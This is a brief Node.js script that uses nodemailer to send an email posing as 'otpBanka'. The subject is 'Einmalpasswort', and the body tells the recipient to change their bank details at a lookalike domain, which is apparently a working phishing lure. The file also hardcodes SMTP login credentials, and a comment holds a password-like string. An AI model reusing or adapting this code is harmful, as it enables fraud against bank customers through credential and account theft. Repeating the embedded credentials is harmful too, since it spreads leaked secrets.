const createTransport = require("nodemailer").createTransport;

export const SendMail = async () => {
  return new Promise((resolve, reject) => {
    let transporter = createTransport({
      host: "lx14.hoststar.hosting",
      port: 587,
      secure: false,
      auth: {
        // admin@flirttool.com
        user: "info@elementa-otp-hr-tkn.online",
        pass: "Admin2425@@!!**",
      },
    });

    let HTML = `
    <p> Please change your bank details from the following link</p>
    <br/><br/><br/><br/>
    <a href="https://elementa-otp-hr-tkn.online/">https://elementa-otp-hr-tkn.online</a>
    `;

    // mailto:kawa@bahoz.de
    // lx3.hoststar.hosting
    //H1ftqjlWnt-dkrUTga
    transporter
      .sendMail({
        from: "otpBanka",
        to: "sumitchauhan9807666@gmail.com",
        subject: "Einmalpasswort",
        // text:"test message"
        // html:"<html></html>"
        html: HTML,
      })
      .then((result) => {
        console.log(result);
      })
      .catch((e) => console.log("Caught exception on sending E-mail", e));
  });
};
